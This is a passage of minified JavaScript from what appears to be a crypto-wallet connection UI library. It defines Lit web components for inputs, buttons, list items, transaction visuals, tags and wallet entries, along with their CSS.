        tabIdx=${ye(this.tabIdx)}
      ></wui-input-text>
      ${this.templateError()}
    `}templateError(){return this.errorMessage?F`<wui-text variant="tiny-500" color="error-100">${this.errorMessage}</wui-text>`:null}};up.styles=[ht,F$e];C4([V()],up.prototype,"errorMessage",void 0);C4([V({type:Boolean})],up.prototype,"disabled",void 0);C4([V()],up.prototype,"value",void 0);C4([V()],up.prototype,"tabIdx",void 0);up=C4([me("wui-email-input")],up);const q$e=ge`
  :host {
    position: relative;
    width: 100%;
    display: inline-block;
    color: var(--wui-color-fg-275);
  }

  .error {
    margin: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-0) var(--wui-spacing-m);
  }

  .base-name {
    position: absolute;
    right: 45px;
    top: 15px;
    text-align: right;
  }
`;var E4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let dp=class extends he{constructor(){super(...arguments),this.disabled=!1,this.loading=!1}render(){return F`
      <wui-input-text
        value=${ye(this.value)}
        ?disabled=${this.disabled}
        .value=${this.value||""}
        data-testid="wui-ens-input"
        inputRightPadding="5xl"
      >
        ${this.baseNameTemplate()} ${this.errorTemplate()}${this.loadingTemplate()}
      </wui-input-text>
    `}baseNameTemplate(){return F`<wui-text variant="paragraph-400" color="fg-200" class="base-name">
      ${Me.WC_NAME_SUFFIX}
    </wui-text>`}loadingTemplate(){return this.loading?F`<wui-loading-spinner size="md" color="accent-100"></wui-loading-spinner>`:null}errorTemplate(){return this.errorMessage?F`<wui-text variant="tiny-500" color="error-100" class="error"
        >${this.errorMessage}</wui-text
      >`:null}};dp.styles=[ht,q$e];E4([V()],dp.prototype,"errorMessage",void 0);E4([V({type:Boolean})],dp.prototype,"disabled",void 0);E4([V()],dp.prototype,"value",void 0);E4([V({type:Boolean})],dp.prototype,"loading",void 0);dp=E4([me("wui-ens-input")],dp);const z$e=ge`
  button {
    border-radius: var(--local-border-radius);
    color: var(--wui-color-fg-100);
    padding: var(--local-padding);
  }

  @media (max-width: 700px) {
    button {
      padding: var(--wui-spacing-s);
    }
  }

  button > wui-icon {
    pointer-events: none;
  }

  button:disabled > wui-icon {
    color: var(--wui-color-bg-300) !important;
  }

  button:disabled {
    background-color: transparent;
  }
`;var _4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let hp=class extends he{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.icon="copy",this.iconColor="inherit"}render(){const e=this.size==="lg"?"--wui-border-radius-xs":"--wui-border-radius-xxs",t=this.size==="lg"?"--wui-spacing-1xs":"--wui-spacing-2xs";return this.style.cssText=`
    --local-border-radius: var(${e});
    --local-padding: var(${t});
`,F`
      <button ?disabled=${this.disabled}>
        <wui-icon color=${this.iconColor} size=${this.size} name=${this.icon}></wui-icon>
      </button>
    `}};hp.styles=[ht,fr,b4,z$e];_4([V()],hp.prototype,"size",void 0);_4([V({type:Boolean})],hp.prototype,"disabled",void 0);_4([V()],hp.prototype,"icon",void 0);_4([V()],hp.prototype,"iconColor",void 0);hp=_4([me("wui-icon-link")],hp);const W$e=ge`
  button {
    background-color: var(--wui-color-fg-300);
    border-radius: var(--wui-border-radius-4xs);
    width: 16px;
    height: 16px;
  }

  button:disabled {
    background-color: var(--wui-color-bg-300);
  }

  wui-icon {
    color: var(--wui-color-bg-200) !important;
  }

  button:focus-visible {
    background-color: var(--wui-color-fg-250);
    border: 1px solid var(--wui-color-accent-100);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-fg-250);
    }

    button:active:enabled {
      background-color: var(--wui-color-fg-225);
    }
  }
`;var _ee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ey=class extends he{constructor(){super(...arguments),this.icon="copy"}render(){return F`
      <button>
        <wui-icon color="inherit" size="xxs" name=${this.icon}></wui-icon>
      </button>
    `}};ey.styles=[ht,fr,W$e];_ee([V()],ey.prototype,"icon",void 0);ey=_ee([me("wui-input-element")],ey);const H$e=ge`
  :host {
    position: relative;
    display: inline-block;
  }

  input {
    width: 50px;
    height: 50px;
    background: var(--wui-color-gray-glass-010);
    border-radius: var(--wui-border-radius-xs);
    border: 1px solid var(--wui-color-gray-glass-005);
    font-family: var(--wui-font-family);
    font-size: var(--wui-font-size-large);
    font-weight: var(--wui-font-weight-regular);
    letter-spacing: var(--wui-letter-spacing-large);
    text-align: center;
    color: var(--wui-color-fg-100);
    caret-color: var(--wui-color-accent-100);
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      box-shadow var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color, box-shadow;
    box-sizing: border-box;
    -webkit-appearance: none;
    -moz-appearance: textfield;
    padding: 0px;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-color-gray-glass-010);
    background: var(--wui-color-gray-glass-005);
  }

  input:focus:enabled {
    background-color: var(--wui-color-gray-glass-015);
    border: 1px solid var(--wui-color-accent-100);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  @media (hover: hover) and (pointer: fine) {
    input:hover:enabled {
      background-color: var(--wui-color-gray-glass-015);
    }
  }
`;var LR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Lw=class extends he{constructor(){super(...arguments),this.disabled=!1,this.value=""}render(){return F`<input
      type="number"
      maxlength="1"
      inputmode="numeric"
      autofocus
      ?disabled=${this.disabled}
      value=${this.value}
    /> `}};Lw.styles=[ht,fr,H$e];LR([V({type:Boolean})],Lw.prototype,"disabled",void 0);LR([V({type:String})],Lw.prototype,"value",void 0);Lw=LR([me("wui-input-numeric")],Lw);const V$e=ge`
  button {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
    border-radius: var(--wui-border-radius-3xs);
    background-color: transparent;
    color: var(--wui-color-accent-100);
  }

  button:disabled {
    background-color: transparent;
    color: var(--wui-color-gray-glass-015);
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-005);
  }
`;var CC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ig=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.disabled=!1,this.color="inherit"}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        <slot name="iconLeft"></slot>
        <wui-text variant="small-600" color=${this.color}>
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}};ig.styles=[ht,fr,V$e];CC([V()],ig.prototype,"tabIdx",void 0);CC([V({type:Boolean})],ig.prototype,"disabled",void 0);CC([V()],ig.prototype,"color",void 0);ig=CC([me("wui-link")],ig);const K$e=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 11px 18px 11px var(--wui-spacing-s);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
    transition:
      color var(--wui-ease-out-power-1) var(--wui-duration-md),
      background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: color, background-color;
  }

  button[data-iconvariant='square'],
  button[data-iconvariant='square-blue'] {
    padding: 6px 18px 6px 9px;
  }

  button > wui-flex {
    flex: 1;
  }

  button > wui-image {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
  }

  button > wui-icon {
    width: 36px;
    height: 36px;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  button > wui-icon-box[data-variant='blue'] {
    box-shadow: 0 0 0 2px var(--wui-color-accent-glass-005);
  }

  button > wui-icon-box[data-variant='overlay'] {
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  button > wui-icon-box[data-variant='square-blue'] {
    border-radius: var(--wui-border-radius-3xs);
    position: relative;
    border: none;
    width: 36px;
    height: 36px;
  }

  button > wui-icon-box[data-variant='square-blue']::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-accent-glass-010);
    pointer-events: none;
  }

  button > wui-icon:last-child {
    width: 14px;
    height: 14px;
  }

  button:disabled {
    color: var(--wui-color-gray-glass-020);
  }

  button[data-loading='true'] > wui-icon {
    opacity: 0;
  }

  wui-loading-spinner {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
  }
`;var ku=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ba=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.variant="icon",this.disabled=!1,this.imageSrc=void 0,this.alt=void 0,this.chevron=!1,this.loading=!1}render(){return F`
      <button
        ?disabled=${this.loading?!0:!!this.disabled}
        data-loading=${this.loading}
        data-iconvariant=${ye(this.iconVariant)}
        tabindex=${ye(this.tabIdx)}
      >
        ${this.loadingTemplate()} ${this.visualTemplate()}
        <wui-flex gap="3xs">
          <slot></slot>
        </wui-flex>
        ${this.chevronTemplate()}
      </button>
    `}visualTemplate(){if(this.variant==="image"&&this.imageSrc)return F`<wui-image src=${this.imageSrc} alt=${this.alt??"list item"}></wui-image>`;if(this.iconVariant==="square"&&this.icon&&this.variant==="icon")return F`<wui-icon name=${this.icon}></wui-icon>`;if(this.variant==="icon"&&this.icon&&this.iconVariant){const e=["blue","square-blue"].includes(this.iconVariant)?"accent-100":"fg-200",t=this.iconVariant==="square-blue"?"mdl":"md",i=this.iconSize?this.iconSize:t;return F`
        <wui-icon-box
          data-variant=${this.iconVariant}
          icon=${this.icon}
          iconSize=${i}
          background="transparent"
          iconColor=${e}
          backgroundColor=${e}
          size=${t}
        ></wui-icon-box>
      `}return null}loadingTemplate(){return this.loading?F`<wui-loading-spinner color="fg-300"></wui-loading-spinner>`:F``}chevronTemplate(){return this.chevron?F`<wui-icon size="inherit" color="fg-200" name="chevronRight"></wui-icon>`:null}};Ba.styles=[ht,fr,K$e];ku([V()],Ba.prototype,"icon",void 0);ku([V()],Ba.prototype,"iconSize",void 0);ku([V()],Ba.prototype,"tabIdx",void 0);ku([V()],Ba.prototype,"variant",void 0);ku([V()],Ba.prototype,"iconVariant",void 0);ku([V({type:Boolean})],Ba.prototype,"disabled",void 0);ku([V()],Ba.prototype,"imageSrc",void 0);ku([V()],Ba.prototype,"alt",void 0);ku([V({type:Boolean})],Ba.prototype,"chevron",void 0);ku([V({type:Boolean})],Ba.prototype,"loading",void 0);Ba=ku([me("wui-list-item")],Ba);var Fk;(function(r){r.approve="approved",r.bought="bought",r.borrow="borrowed",r.burn="burnt",r.cancel="canceled",r.claim="claimed",r.deploy="deployed",r.deposit="deposited",r.execute="executed",r.mint="minted",r.receive="received",r.repay="repaid",r.send="sent",r.sell="sold",r.stake="staked",r.trade="swapped",r.unstake="unstaked",r.withdraw="withdrawn"})(Fk||(Fk={}));const G$e=ge`
  :host > wui-flex {
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    width: 40px;
    height: 40px;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-gray-glass-005);
  }

  :host > wui-flex wui-image {
    display: block;
  }

  :host > wui-flex,
  :host > wui-flex wui-image,
  .swap-images-container,
  .swap-images-container.nft,
  wui-image.nft {
    border-top-left-radius: var(--local-left-border-radius);
    border-top-right-radius: var(--local-right-border-radius);
    border-bottom-left-radius: var(--local-left-border-radius);
    border-bottom-right-radius: var(--local-right-border-radius);
  }

  wui-icon {
    width: 20px;
    height: 20px;
  }

  wui-icon-box {
    position: absolute;
    right: 0;
    bottom: 0;
    transform: translate(20%, 20%);
  }

  .swap-images-container {
    position: relative;
    width: 40px;
    height: 40px;
    overflow: hidden;
  }

  .swap-images-container wui-image:first-child {
    position: absolute;
    width: 40px;
    height: 40px;
    top: 0;
    left: 0%;
    clip-path: inset(0px calc(50% + 2px) 0px 0%);
  }

  .swap-images-container wui-image:last-child {
    clip-path: inset(0px 0px 0px calc(50% + 2px));
  }
`;var d2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Md=class extends he{constructor(){super(...arguments),this.images=[],this.secondImage={type:void 0,url:""}}render(){const[e,t]=this.images,i=e?.type==="NFT",n=t?.url?t.type==="NFT":i,s=i?"var(--wui-border-radius-xxs)":"var(--wui-border-radius-s)",o=n?"var(--wui-border-radius-xxs)":"var(--wui-border-radius-s)";return this.style.cssText=`
    --local-left-border-radius: ${s};
    --local-right-border-radius: ${o};
    `,F`<wui-flex> ${this.templateVisual()} ${this.templateIcon()} </wui-flex>`}templateVisual(){const[e,t]=this.images,i=e?.type;return this.images.length===2&&(e?.url||t?.url)?F`<div class="swap-images-container">
        ${e?.url?F`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:null}
        ${t?.url?F`<wui-image src=${t.url} alt="Transaction image"></wui-image>`:null}
      </div>`:e?.url?F`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:i==="NFT"?F`<wui-icon size="inherit" color="fg-200" name="nftPlaceholder"></wui-icon>`:F`<wui-icon size="inherit" color="fg-200" name="coinPlaceholder"></wui-icon>`}templateIcon(){let e="accent-100",t;return t=this.getIcon(),this.status&&(e=this.getStatusColor()),t?F`
      <wui-icon-box
        size="xxs"
        iconColor=${e}
        backgroundColor=${e}
        background="opaque"
        icon=${t}
        ?border=${!0}
        borderColor="wui-color-bg-125"
      ></wui-icon-box>
    `:null}getDirectionIcon(){switch(this.direction){case"in":return"arrowBottom";case"out":return"arrowTop";default:return}}getIcon(){return this.onlyDirectionIcon?this.getDirectionIcon():this.type==="trade"?"swapHorizontalBold":this.type==="approve"?"checkmark":this.type==="cancel"?"close":this.getDirectionIcon()}getStatusColor(){switch(this.status){case"confirmed":return"success-100";case"failed":return"error-100";case"pending":return"inverse-100";default:return"accent-100"}}};Md.styles=[G$e];d2([V()],Md.prototype,"type",void 0);d2([V()],Md.prototype,"status",void 0);d2([V()],Md.prototype,"direction",void 0);d2([V({type:Boolean})],Md.prototype,"onlyDirectionIcon",void 0);d2([V({type:Array})],Md.prototype,"images",void 0);d2([V({type:Object})],Md.prototype,"secondImage",void 0);Md=d2([me("wui-transaction-visual")],Md);const Z$e=ge`
  :host > wui-flex:first-child {
    align-items: center;
    column-gap: var(--wui-spacing-s);
    padding: 6.5px var(--wui-spacing-xs) 6.5px var(--wui-spacing-xs);
    width: 100%;
  }

  :host > wui-flex:first-child wui-text:nth-child(1) {
    text-transform: capitalize;
  }

  wui-transaction-visual {
    width: 40px;
    height: 40px;
  }

  wui-flex {
    flex: 1;
  }

  :host wui-flex wui-flex {
    overflow: hidden;
  }

  :host .description-container wui-text span {
    word-break: break-all;
  }

  :host .description-container wui-text {
    overflow: hidden;
  }

  :host .description-separator-icon {
    margin: 0px 6px;
  }

  :host wui-text > span {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }
`;var Nu=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ma=class extends he{constructor(){super(...arguments),this.type="approve",this.onlyDirectionIcon=!1,this.images=[],this.price=[],this.amount=[],this.symbol=[]}render(){return F`
      <wui-flex>
        <wui-transaction-visual
          .status=${this.status}
          direction=${ye(this.direction)}
          type=${this.type}
          onlyDirectionIcon=${ye(this.onlyDirectionIcon)}
          .images=${this.images}
        ></wui-transaction-visual>
        <wui-flex flexDirection="column" gap="3xs">
          <wui-text variant="paragraph-600" color="fg-100">
            ${Fk[this.type]||this.type}
          </wui-text>
          <wui-flex class="description-container">
            ${this.templateDescription()} ${this.templateSecondDescription()}
          </wui-flex>
        </wui-flex>
        <wui-text variant="micro-700" color="fg-300"><span>${this.date}</span></wui-text>
      </wui-flex>
    `}templateDescription(){const e=this.descriptions?.[0];return e?F`
          <wui-text variant="small-500" color="fg-200">
            <span>${e}</span>
          </wui-text>
        `:null}templateSecondDescription(){const e=this.descriptions?.[1];return e?F`
          <wui-icon class="description-separator-icon" size="xxs" name="arrowRight"></wui-icon>
          <wui-text variant="small-400" color="fg-200">
            <span>${e}</span>
          </wui-text>
        `:null}};Ma.styles=[ht,Z$e];Nu([V()],Ma.prototype,"type",void 0);Nu([V({type:Array})],Ma.prototype,"descriptions",void 0);Nu([V()],Ma.prototype,"date",void 0);Nu([V({type:Boolean})],Ma.prototype,"onlyDirectionIcon",void 0);Nu([V()],Ma.prototype,"status",void 0);Nu([V()],Ma.prototype,"direction",void 0);Nu([V({type:Array})],Ma.prototype,"images",void 0);Nu([V({type:Array})],Ma.prototype,"price",void 0);Nu([V({type:Array})],Ma.prototype,"amount",void 0);Nu([V({type:Array})],Ma.prototype,"symbol",void 0);Ma=Nu([me("wui-transaction-list-item")],Ma);const Y$e=ge`
  :host > wui-flex:first-child {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
  }

  wui-flex {
    display: flex;
    flex: 1;
  }
`;var J$e=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let b7=class extends he{render(){return F`
      <wui-flex alignItems="center">
        <wui-shimmer width="40px" height="40px"></wui-shimmer>
        <wui-flex flexDirection="column" gap="2xs">
          <wui-shimmer width="72px" height="16px" borderRadius="4xs"></wui-shimmer>
          <wui-shimmer width="148px" height="14px" borderRadius="4xs"></wui-shimmer>
        </wui-flex>
        <wui-shimmer width="24px" height="12px" borderRadius="5xs"></wui-shimmer>
      </wui-flex>
    `}};b7.styles=[ht,Y$e];b7=J$e([me("wui-transaction-list-item-loader")],b7);const Q$e=ge`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    height: var(--wui-spacing-m);
    padding: 0 var(--wui-spacing-3xs) !important;
    border-radius: var(--wui-border-radius-5xs);
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host > wui-text {
    transform: translateY(5%);
  }

  :host([data-variant='main']) {
    background-color: var(--wui-color-accent-glass-015);
    color: var(--wui-color-accent-100);
  }

  :host([data-variant='shade']) {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  :host([data-variant='success']) {
    background-color: var(--wui-icon-box-bg-success-100);
    color: var(--wui-color-success-100);
  }

  :host([data-variant='error']) {
    background-color: var(--wui-icon-box-bg-error-100);
    color: var(--wui-color-error-100);
  }

  :host([data-size='lg']) {
    padding: 11px 5px !important;
  }

  :host([data-size='lg']) > wui-text {
    transform: translateY(2%);
  }
`;var UR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Uw=class extends he{constructor(){super(...arguments),this.variant="main",this.size="lg"}render(){this.dataset.variant=this.variant,this.dataset.size=this.size;const e=this.size==="md"?"mini-700":"micro-700";return F`
      <wui-text data-variant=${this.variant} variant=${e} color="inherit">
        <slot></slot>
      </wui-text>
    `}};Uw.styles=[ht,Q$e];UR([V()],Uw.prototype,"variant",void 0);UR([V()],Uw.prototype,"size",void 0);Uw=UR([me("wui-tag")],Uw);const X$e=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-tag {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-300);
  }

  wui-icon {
    color: var(--wui-color-fg-200) !important;
  }
`;var Ic=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Uo=class extends he{constructor(){super(...arguments),this.walletImages=[],this.imageSrc="",this.name="",this.tabIdx=void 0,this.installed=!1,this.disabled=!1,this.showAllWallets=!1,this.loading=!1}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        ${this.templateAllWallets()} ${this.templateWalletImage()}
        <wui-text variant="paragraph-500" color="inherit">${this.name}</wui-text>
        ${this.templateStatus()}
      </button>
    `}templateAllWallets(){return this.showAllWallets&&this.imageSrc?F` <wui-all-wallets-image .imageeSrc=${this.imageSrc}> </wui-all-wallets-image> `:this.showAllWallets&&this.walletIcon?F` <wui-wallet-image .walletIcon=${this.walletIcon} size="sm"> </wui-wallet-image> `:null}templateWalletImage(){return!this.showAllWallets&&this.imageSrc?F`<wui-wallet-image
        size="sm"
        imageSrc=${this.imageSrc}
        name=${this.name}
        .installed=${this.installed}
      ></wui-wallet-image>`:!this.showAllWallets&&!this.imageSrc?F`<wui-wallet-image size="sm" name=${this.name}></wui-wallet-image>`:null}templateStatus(){return this.loading?F`<wui-loading-spinner size="lg" color="accent-100"></wui-loading-spinner>`:this.tagLabel&&this.tagVariant?F`<wui-tag variant=${this.tagVariant}>${this.tagLabel}</wui-tag>`:this.icon?F`<wui-icon color="inherit" size="sm" name=${this.icon}></wui-icon>`:null}};Uo.styles=[ht,fr,X$e];Ic([V({type:Array})],Uo.prototype,"walletImages",void 0);Ic([V()],Uo.prototype,"imageSrc",void 0);Ic([V()],Uo.prototype,"name",void 0);Ic([V()],Uo.prototype,"tagLabel",void 0);Ic([V()],Uo.prototype,"tagVariant",void 0);Ic([V()],Uo.prototype,"icon",void 0);Ic([V()],Uo.prototype,"walletIcon",void 0);Ic([V()],Uo.prototype,"tabIdx",void 0);Ic([V({type:Boolean})],Uo.prototype,"installed",void 0);Ic([V({type:Boolean})],Uo.prototype,"disabled",void 0);Ic([V({type:Boolean})],Uo.prototype,"showAllWallets",void 0);Ic([V({type:Boolean})],Uo.prototype,"loading",void 0);Uo=Ic([me("wui-list-wallet")],Uo);const eRe=ge`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-005);
    overflow: hidden;
  }

  wui-icon {
    width: 100%;
    height: 100%;
  }
`;var See=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ty=class extends he{constructor(){super(...arguments),this.logo="google"}render(){return F`<wui-icon color="inherit" size="inherit" name=${this.logo}></wui-icon> `}};ty.styles=[ht,eRe];See([V()],ty.prototype,"logo",void 0);ty=See([me("wui-logo")],ty);const tRe=ge`
  :host {
    display: block;
    width: 100%;
  }

  button {
    width: 100%;
    height: 56px;
    background: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`;var EC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ng=class extends he{constructor(){super(...arguments),this.logo="google",this.disabled=!1,this.tabIdx=void 0}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        <wui-logo logo=${this.logo}></wui-logo>
      </button>
    `}};ng.styles=[ht,fr,tRe];EC([V()],ng.prototype,"logo",void 0);EC([V({type:Boolean})],ng.prototype,"disabled",void 0);EC([V()],ng.prototype,"tabIdx",void 0);ng=EC([me("wui-logo-select")],ng);const rRe=ge`
  :host {
    display: block;
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
    display: flex;
    gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-2xs) var(--wui-spacing-s) var(--wui-spacing-2xs)
      var(--wui-spacing-xs);
    border: 1px solid var(--wui-color-gray-glass-010);
    background-color: var(--wui-color-gray-glass-005);
    color: var(--wui-color-fg-100);
  }

  button:disabled {
    border: 1px solid var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-010);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-015);
    }
  }

  wui-image,
  wui-icon-box {
    border-radius: var(--wui-border-radius-3xl);
    width: 24px;
    height: 24px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }
`;var _C=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let sg=class extends he{constructor(){super(...arguments),this.imageSrc=void 0,this.isUnsupportedChain=void 0,this.disabled=!1}render(){return F`
      <button data-testid="wui-network-button" ?disabled=${this.disabled}>
        ${this.visualTemplate()}
        <wui-text variant="paragraph-600" color="inherit">
          <slot></slot>
        </wui-text>
      </button>
    `}visualTemplate(){return this.isUnsupportedChain?F`
        <wui-icon-box
          size="sm"
          iconColor="error-100"
          backgroundColor="error-100"
          icon="warningCircle"
        ></wui-icon-box>
      `:this.imageSrc?F`<wui-image src=${this.imageSrc}></wui-image>`:F`
      <wui-icon-box
        size="sm"
        iconColor="inverse-100"
        backgroundColor="fg-100"
        icon="networkPlaceholder"
      ></wui-icon-box>
